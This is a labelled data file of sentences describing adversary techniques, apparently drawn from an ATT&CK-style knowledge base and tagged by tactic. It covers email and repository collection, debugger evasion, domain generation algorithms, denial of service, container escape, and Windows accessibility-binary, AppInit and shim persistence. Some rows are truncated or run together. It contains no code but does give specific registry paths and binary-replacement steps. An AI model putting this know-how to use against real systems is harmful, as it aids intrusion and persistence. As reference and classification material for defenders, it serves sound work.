"Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.",COLLECTION,,,
Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization.,COLLECTION,,,
"The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:



* Policies, procedures, and standards

* Physical / logical network diagrams

Information stored in a repository may vary based on the specific instance or environment.,COLLECTION,,,
"Specific common information repositories include web-based platforms such as [Sharepoint] and [Confluence], specific services such as Code Repositories, IaaS databases, enterprise databases, and other storage infrastructure such as SQL Server.",COLLECTION,,,
Adversaries may leverage code repositories to collect valuable information.,COLLECTION,,,
Code repositories are tools/services that store source code and automate software builds.,COLLECTION,,,
"They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket.",COLLECTION,,,
Users typically interact with code repositories through a web application or command-line utilities such as git.,COLLECTION,,,
"Once adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or credentials contained within software's source code.",COLLECTION,,,
"Having access to software's source code may allow adversaries to develop [Exploits], while credentials may provide access to additional resources using [Valid Accounts].",COLLECTION,,,
Adversaries may leverage Confluence repositories to mine valuable information.,COLLECTION,,,
"Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:



* Policies, procedures, and standards

* Testing / development credentials

* Work / project schedules

* Source code snippets

* Links to network shares and other internal resources.",COLLECTION,,,
Adversaries may leverage the SharePoint repository as a source to mine valuable information.,COLLECTION,,,
SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems.,COLLECTION,,,
"For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:

"Adversaries may do this using a [Command and Scripting Interpreter], such as [cmd] as well as a [Network Device CLI], which have functionality to interact with the file system to gather information.",COLLECTION,,,
Adversaries may also use [Automated Collection] on the local system.,COLLECTION,,,
"Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration.",COLLECTION,,,
"Interactive command shells may be in use, and common functionality within [cmd] may be used to gather information.",COLLECTION,,,
Adversaries may search connected removable media on computers they have compromised to find files of interest.,COLLECTION,,,
"Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration.",COLLECTION,,,
Some adversaries may also use [Automated Collection] on removable media.,COLLECTION,,,
"Similar to [Virtualization/Sandbox Evasion], if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant.",DEFENSE_EVASION,DISCOVERY,,
They may also search for debugger artifacts before dropping secondary or additional payloads.,DEFENSE_EVASION,DISCOVERY,,
"Specific checks will vary based on the target and/or adversary, but may involve [Native API] function calls such as IsDebuggerPresent() and NtQueryInformationProcess(), or manually checking the BeingDebugged flag of the Process Environment Block (PEB).",DEFENSE_EVASION,DISCOVERY,,
"Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would “swallow” or handle the potential error).",DEFENSE_EVASION,DISCOVERY,,
Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors.,DEFENSE_EVASION,DISCOVERY,,
Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping [Native API] function calls such as OutputDebugStringW().,DEFENSE_EVASION,DISCOVERY,,
"Reasons for [Defacement] include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion.",IMPACT,,,
"Disturbing or offensive images may be used as a part of [Defacement] in order to cause user discomfort, or to pressure compliance with accompanying messages.",IMPACT,,,
"An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. [External Defacement] may ultimately cause users to distrust the systems and to question/discredit the system’s integrity.",IMPACT,,,
Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.,IMPACT,,,
"This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper.",IMPACT,,,
Adversaries may use [Obfuscated Files or Information] to hide artifacts of an intrusion from analysis.,DEFENSE_EVASION,,,
They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it.,DEFENSE_EVASION,,,
Methods for doing that include built-in functionality of malware or by using utilities present on the system.,DEFENSE_EVASION,,,
One such example is use of [certutil] to decode a remote access tool portable executable file that has been hidden inside a certificate file.,DEFENSE_EVASION,,,
Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution].,DEFENSE_EVASION,,,
The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.,DEFENSE_EVASION,,,
Adversaries may deploy a container into an environment to facilitate execution or evade defenses.,DEFENSE_EVASION,EXECUTION,,
"In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware.",DEFENSE_EVASION,EXECUTION,,
"In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment.",DEFENSE_EVASION,EXECUTION,,
"Containers can be deployed by various means, such as via Docker's create and start APIs or via a web application such as the Kubernetes dashboard or Kubeflow.",DEFENSE_EVASION,EXECUTION,,
"Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house.",RESOURCE_DEVELOPMENT,,,

"As with legitimate development efforts, different skill sets may be required for developing capabilities.",RESOURCE_DEVELOPMENT,,,
"The skills needed may be located in-house, or may need to be contracted out.",RESOURCE_DEVELOPMENT,,,
"Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.",RESOURCE_DEVELOPMENT,,,
Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted.,RESOURCE_DEVELOPMENT,,,
Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.,RESOURCE_DEVELOPMENT,,,
Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.,RESOURCE_DEVELOPMENT,,,
"Prior to [Code Signing], adversaries may develop self-signed code signing certificates for use in operations.",RESOURCE_DEVELOPMENT,,,
Adversaries may create self-signed SSL/TLS certificates that can be used during targeting.,RESOURCE_DEVELOPMENT,,,
SSL/TLS certificates are designed to instill trust.,RESOURCE_DEVELOPMENT,,,
"They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct.",RESOURCE_DEVELOPMENT,,,
"If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.",RESOURCE_DEVELOPMENT,,,
"In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).",RESOURCE_DEVELOPMENT,,,
"Adversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography] with [Web Protocols]) or even enabling [Adversary-in-the-Middle] if added to the root of trust (i.e. [Install Root Certificate]).",RESOURCE_DEVELOPMENT,,,
"After creating a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate]) on infrastructure under their control.",RESOURCE_DEVELOPMENT,,,
Adversaries may develop exploits that can be used during targeting.,RESOURCE_DEVELOPMENT,,,
An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software.,RESOURCE_DEVELOPMENT,,,
"Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.",RESOURCE_DEVELOPMENT,,,

"Some aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure.",RESOURCE_DEVELOPMENT,,,
"For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services].",RESOURCE_DEVELOPMENT,,,
Windows allows programs to have direct access to logical volumes.,DEFENSE_EVASION,,,
Programs with direct access may read and write files directly from the drive by analyzing file system data structures.,DEFENSE_EVASION,,,
This technique bypasses Windows file access controls as well as file system monitoring tools.,DEFENSE_EVASION,,,
"Utilities, such as NinjaCopy, exist to perform these actions in PowerShell.",DEFENSE_EVASION,,,
"With direct write access to a disk, adversaries may attempt to overwrite portions of disk data.",IMPACT,,,

"For example, publicly available scripts such as New-GPOImmediateTask can be leveraged to automate the creation of a malicious [Scheduled Task/Job] by modifying GPO settings, in this case modifying &lt;GPO_PATH&gt;\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.,DISCOVERY,,,
"With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring [Application Access Token].",INITIAL_ACCESS,,,
"Multiple ways of delivering exploit code to a browser exist, including:



* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.

* Malicious ads are paid for and served through legitimate ad providers.

* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).",INITIAL_ACCESS,,,
This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack.,INITIAL_ACCESS,,,
There are several known examples of this occurring.,INITIAL_ACCESS,,,
"Typical drive-by compromise process:
1. A user visits a website that is used to host the adversary controlled content.
2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.
3. Upon finding a vulnerable version, exploit code is delivered to the browser.
4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.
* In some cases a second visit to the website after the initial scan is required before exploit code is delivered.",INITIAL_ACCESS,,,
"Unlike [Exploit Public-Facing Application], the focus of this technique is to exploit software on a client endpoint upon visiting a website.",INITIAL_ACCESS,,,
This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.,INITIAL_ACCESS,,,
"Adversaries may also use compromised websites to deliver a user to a malicious application designed to [Steal Application Access Token]s, like OAuth tokens, to gain access to protected applications and information.",INITIAL_ACCESS,,,
These malicious applications have been delivered through popups on legitimate websites.,INITIAL_ACCESS,,,
This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications.,COMMAND_AND_CONTROL,,,
"These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.",COMMAND_AND_CONTROL,,,
Adversaries may use dynamic resolution for the purpose of [Fallback Channels].,COMMAND_AND_CONTROL,,,
When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.,COMMAND_AND_CONTROL,,,
"Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address.",COMMAND_AND_CONTROL,,,
A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.,COMMAND_AND_CONTROL,,,
One implementation of [DNS Calculation] is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.,COMMAND_AND_CONTROL,,,
Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains.,COMMAND_AND_CONTROL,,,
"This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.",COMMAND_AND_CONTROL,,,
DGAs can take the form of apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter.,COMMAND_AND_CONTROL,,,
"Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net).",COMMAND_AND_CONTROL,,,
"Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc).",COMMAND_AND_CONTROL,,,
Others incorporate a seed value as well to make predicting future domains more difficult for defenders.,COMMAND_AND_CONTROL,,,
Adversaries may use DGAs for the purpose of [Fallback Channels].,COMMAND_AND_CONTROL,,,
When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.,COMMAND_AND_CONTROL,,,
Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution.,COMMAND_AND_CONTROL,,,
"This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.",COMMAND_AND_CONTROL,,,
"The simplest, ""single-flux"" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name.",COMMAND_AND_CONTROL,,,
"These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.",COMMAND_AND_CONTROL,,,
"In contrast, the ""double-flux"" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection.",COMMAND_AND_CONTROL,,,
"With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.",COMMAND_AND_CONTROL,,,
Adversaries may target user email to collect sensitive information.,COLLECTION,,,
"Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries.",COLLECTION,,,
Adversaries can collect or forward email from mail servers or clients.,COLLECTION,,,
Adversaries may setup email forwarding rules to collect sensitive information.,COLLECTION,,,
"Adversaries may abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.",COLLECTION,,,
"Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more.",COLLECTION,,,
"Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.",COLLECTION,,,
Adversaries may target user email on local systems to collect sensitive information.,COLLECTION,,,
"Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.",COLLECTION,,,
Outlook stores data locally in offline data files with an extension of .ost.,COLLECTION,,,
"Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.",COLLECTION,,,
"Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information.",COLLECTION,,,
Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network.,COLLECTION,,,
"Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens.",COLLECTION,,,
Tools such as [MailSniper] can be used to automate searches for specific keywords.,COLLECTION,,,
Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.,COMMAND_AND_CONTROL,,,
"Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",COMMAND_AND_CONTROL,,,
Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.,COMMAND_AND_CONTROL,,,
"Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private.",COMMAND_AND_CONTROL,,,
"Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key.",COMMAND_AND_CONTROL,,,
This ensures that only the intended recipient can read the encrypted data.,COMMAND_AND_CONTROL,,,
Common public key encryption algorithms include RSA and ElGamal.,COMMAND_AND_CONTROL,,,
"For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key.",COMMAND_AND_CONTROL,,,
"As such, these protocols are classified as [Asymmetric Cryptography].",COMMAND_AND_CONTROL,,,
Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.,COMMAND_AND_CONTROL,,,
Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption.,COMMAND_AND_CONTROL,,,
"Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",COMMAND_AND_CONTROL,,,
Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition.,IMPACT,,,
"Example services include websites, email services, DNS, and web-based applications.",IMPACT,,,
Adversaries have been observed conducting DoS attacks for political purposes.,IMPACT,,,
An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service.,IMPACT,,,
Adversaries can target various layers of the application stack that is hosted on the system used to provide the service.,IMPACT,,,
"These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them.",IMPACT,,,
Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components.,IMPACT,,,
"A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).",IMPACT,,,
"To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.",IMPACT,,,
"Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection.",IMPACT,,,
This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.,IMPACT,,,
Botnets are commonly used to conduct DDoS attacks against networks and services.,IMPACT,,,
Large botnets can generate a significant amount of traffic from systems spread across the global internet.,IMPACT,,,
Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack.,IMPACT,,,
"In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources.",IMPACT,,,
"In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult.",IMPACT,,,
"Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.",IMPACT,,,
"In cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume.",IMPACT,,,
This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.,IMPACT,,,
"For attacks attempting to saturate the providing network, see [Network Denial of Service].",IMPACT,,,
"For example, specific features in web applications may be highly resource intensive.",IMPACT,,,
Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.,IMPACT,,,
Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. condition.,IMPACT,,,
"Crashed or restarted applications or systems may also have other effects such as [Data Destruction], [Firmware Corruption], [Service Stop] etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems.",IMPACT,,,
A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity.,IMPACT,,,
These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.,IMPACT,,,
"Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.",IMPACT,,,
ACK floods leverage the stateful nature of the TCP protocol.,IMPACT,,,
A flood of ACK packets are sent to the target.,IMPACT,,,
This forces the OS to search its state table for a related TCP connection that has already been established.,IMPACT,,,
"Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists.",IMPACT,,,
"When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets.",IMPACT,,,
This greatly reduces the resources available for providing the targeted service.,IMPACT,,,
"Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.",IMPACT,,,
"One example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it.",IMPACT,,,
"This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.",IMPACT,,,
"Another variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS.",IMPACT,,,
The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections.,IMPACT,,,
"If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm.",IMPACT,,,
"In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests.",IMPACT,,,
"Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.",IMPACT,,,
This can allow an adversary access to other containerized resources from the host level or to the host itself.,PRIVILEGE_ESCALATION,,,
"In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.",PRIVILEGE_ESCALATION,,,
There are multiple ways an adversary may escape to a host environment.,PRIVILEGE_ESCALATION,,,
"Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host, or utilizing a privileged container to run commands on the underlying host.",PRIVILEGE_ESCALATION,,,
"Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, or setting up a command and control channel on the host.",PRIVILEGE_ESCALATION,,,
Adversaries may create and cultivate accounts with services that can be used during targeting.,RESOURCE_DEVELOPMENT,,,
Adversaries can create accounts that can be used to build a persona to further operations.,RESOURCE_DEVELOPMENT,,,
"Persona development consists of the development of public information, presence, history and appropriate affiliations.",RESOURCE_DEVELOPMENT,,,
"This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.",RESOURCE_DEVELOPMENT,,,
These personas may be fictitious or impersonate real people.,RESOURCE_DEVELOPMENT,,,
"The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.).",RESOURCE_DEVELOPMENT,,,
Establishing a persona may require development of additional documentation to make them seem real.,RESOURCE_DEVELOPMENT,,,
"This could include filling out profile information, developing social networks, or incorporating photos.",RESOURCE_DEVELOPMENT,,,
"Establishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for [Phishing for Information] or [Phishing].",RESOURCE_DEVELOPMENT,,,
Adversaries may create email accounts that can be used during targeting.,RESOURCE_DEVELOPMENT,,,
"Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct [Phishing for Information] or [Phishing].",RESOURCE_DEVELOPMENT,,,
"To decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.",RESOURCE_DEVELOPMENT,,,
Adversaries may create and cultivate social media accounts that can be used during targeting.,RESOURCE_DEVELOPMENT,,,
Adversaries can create social media accounts that can be used to build a persona to further operations.,RESOURCE_DEVELOPMENT,,,
"For operations incorporating social engineering, the utilization of a persona on social media may be important.",RESOURCE_DEVELOPMENT,,,
"The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.).",RESOURCE_DEVELOPMENT,,,
Establishing a persona on social media may require development of additional documentation to make them seem real.,RESOURCE_DEVELOPMENT,,,
Once a persona has been developed an adversary can use it to create connections to targets of interest.,RESOURCE_DEVELOPMENT,,,
Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen).,PERSISTENCE,PRIVILEGE_ESCALATION,,
An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Two common accessibility programs are C:\Windows\System32\sethc.exe, launched when the shift key is pressed five times and C:\Windows\System32\utilman.exe, launched when the Windows + U key combination is pressed.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"Depending on the version of Windows, an adversary may take advantage of these features in different ways.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in %systemdir%\, and it must be protected by Windows File or Resource Protection (WFP/WRP). debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., C:\Windows\System32\utilman.exe) may be replaced with ""cmd.exe"" (or another program that provides backdoor access).",PERSISTENCE,PRIVILEGE_ESCALATION,,
"Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol] will cause the replaced file to be executed with SYSTEM privileges.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"Other accessibility features exist that may also be leveraged in a similar fashion: 



* On-Screen Keyboard: C:\Windows\System32\osk.exe

* Magnifier: C:\Windows\System32\Magnify.exe

* Narrator: C:\Windows\System32\Narrator.exe

* Display Switcher: C:\Windows\System32\DisplaySwitch.exe

* App Switcher: C:\Windows\System32\AtBroker.exe.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs Registry key under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\ are loaded into every process that calls the ubiquitously used application programming interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"Similar to [Process Injection], this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows or HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows are loaded by user32.dll into every process that loads user32.dll.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"In practice this is nearly every program, since user32.dll is a very common library.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity.,PERSISTENCE,PRIVILEGE_ESCALATION,,
The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims.,PERSISTENCE,PRIVILEGE_ESCALATION,,
The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb).",PERSISTENCE,PRIVILEGE_ESCALATION,,
"If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:



* %WINDIR%\AppPatch\sysmain.sdb and

* hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"Custom databases are stored in:



* %WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom and

* hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"However, certain shims can be used to [Bypass User Account Control] (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).",PERSISTENCE,PRIVILEGE_ESCALATION,,
"Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Shims can also be abused to establish persistence by continuously being invoked by affected programs.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may establish persistence by executing malicious content triggered by a file type association.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"When a file is opened, the default program used to open the file (also called the file association or handler) is checked.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.,PERSISTENCE,PRIVILEGE_ESCALATION,,
